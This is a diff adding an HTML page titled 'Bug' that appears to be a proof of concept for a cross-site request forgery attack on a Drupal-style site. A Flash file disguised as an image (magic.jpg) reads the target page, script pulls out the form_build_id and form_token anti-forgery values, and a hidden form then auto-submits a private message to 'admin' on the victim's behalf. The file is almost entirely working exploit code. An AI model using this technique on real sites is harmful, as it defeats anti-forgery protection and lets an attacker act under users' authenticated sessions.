@@ -1,0 +1,35 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2//EN">
+   <html>
+     <head>
+       <title>Bug</title>
+     </head>
+     <body>
+       <script type="text/javascript">
+         var x ;
+         function nice(x)
+         {
+           x = unescape(x);
+           var id = x.split("form_build_id\"value=\"")[1].split("\"")[0];
+           var token =  x.split("form_token\"value=\"")[1].split("\"")[0];
+           document.getElementsByName("form_build_id")[0].value = id;
+           document.getElementsByName("form_token")[0].value = token;
+           console.log(document.getElementById("csrf").submit());
+} </script>
+       <object style="width:1px;height:1px" data="https://staging.example.com/sites/default/files/magic.jpg" type="application/x-shockwave-flash" allowscriptaccess="always" flashvars="callback=nice&url=https://staging.example.com/">
+       </object>
+       <embed src="" allowscript="always" flashvars>
+       </embed>
+       <form id = "csrf"
+       action="https://staging.example.com/messages/
+       new" method="POST">
+        <input type="hidden" name="recipient" value="admin" />
+        <input type="hidden" name="subject" value="meassages" />
+        <input type="hidden" name="body[value]" value="DemoHAX :)" />
+        <input type="hidden" name="form_build_id" value="" />
+        <input type="hidden" name="form_token" value="" />
+        <input type="hidden" name="form_id" value="privatemsg_new" />
+         <input type="hidden" name="op" value="Send message" />
+        <input type="submit" value="Submit request" />
+       </form>
+     </body>
+</html>
